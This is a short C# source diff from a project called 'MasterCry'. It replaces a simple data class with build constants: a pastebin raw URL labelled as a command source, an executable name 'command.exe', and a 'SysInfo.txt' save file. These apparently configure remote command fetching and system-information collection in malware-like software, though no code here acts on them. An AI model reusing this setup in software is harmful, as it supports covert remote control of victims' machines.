@@ -1,11 +1,11 @@
 ﻿
 /****************************** ghost1372.github.io ******************************\
-*	Module Name:	Members.cs
+*	Module Name:	BuildVars.cs
 *	Project:		MasterCry
 *	Copyright (C) 2017 Mahdi Hosseini, All rights reserved.
 *	This software may be modified and distributed under the terms of the MIT license.  See LICENSE file for details.
 *
-*	Written by Mahdi Hosseini <Mahdidvb72@gmail.com>,  2017, 9, 21, 02:47 ب.ظ
+*	Written by Mahdi Hosseini <Mahdidvb72@gmail.com>,  2017, 9, 21, 03:21 ب.ظ
 *	
 ***********************************************************************************/
 
@@ -16,17 +16,12 @@ using System.Text;
 
 namespace MasterCry
 {
-    class Members
+    class BuildVars
     {
-        public string Name { get; set; }
+        public static string Save_Location = "SysInfo.txt";
+        public static string Command_URL = "https://pastebin.com/raw/QF4BXM6D";
+        public static string Exe_Name = "command.exe";
+        public static string Config_Command_Version = "CommandVersion";
 
-        public string Path { get; set; }
-
-        public string Id { get; set; }
-
-        public override string ToString()
-        {
-            return "ID: " + Id + "   Name: " + Name + "   Path: " + Path;
-        }
     }
 }
